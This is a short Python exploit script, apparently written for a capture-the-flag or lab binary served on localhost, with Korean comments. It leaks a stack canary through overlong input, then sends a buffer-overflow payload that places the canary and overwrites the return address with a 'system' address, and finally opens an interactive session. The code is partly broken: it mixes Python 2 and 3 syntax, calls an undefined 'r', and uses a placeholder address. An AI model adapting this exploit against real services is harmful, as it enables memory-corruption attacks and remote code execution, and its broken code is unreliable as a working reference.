#! /usr/bin/python
# -*- coding: utf-8 -*-
from socket import *
from select import *
import sys
from time import ctime
import time
import pwn
HOST = '127.0.0.1'
PORT = int(sys.argv[1])

BUFSIZE = 1024
ADDR = (HOST,PORT)

clientSocket = socket(AF_INET, SOCK_STREAM)# 서버에 접속하기 위한 소켓을 생성한다.

try:
    clientSocket.connect(ADDR)# 서버에 접속을 시도한다.
    #clientSocket.send('Hello!'.encode())    # 서버에 메시지 전달
    time.sleep(0.1)
    print(clientSocket.recv(1024))

except  Exception as e:
    print('%s:%s'%ADDR)
    sys.exit()

a=["11","a"*41,"11","b"*40+'\x00']
for raw_inputa in a:
#canary leak
    clientSocket.send(raw_inputa.encode())
    msg = clientSocket.recv(1024)
    if raw_inputa == "a"*41:
        leaked_canary = "\x00"+msg[-3:]
        canary = pwn.u32(leaked_canary)
        print canary
    else:
        print(msg)
    r.interactive()
#system = 0x8048620
system = 0x44444444
binsh = 0xf7f660cf - 0x0f7de8000
pay = ""
pay += "a"*39
pay += pwn.p32(canary)
pay += 'b'*8
pay += pwn.p32(system)
print pay
clientSocket.send(pay)
msg = clientSocket.recv(1024)
print(msg)
#clientSocket.send(pay.encode())
#msg=clientSocket.recv(1024)
while 1:
    clientSocket.send(raw_input().encode())
    msg = clientSocket.recv(1024)
    print(msg)
print('connect is success')






















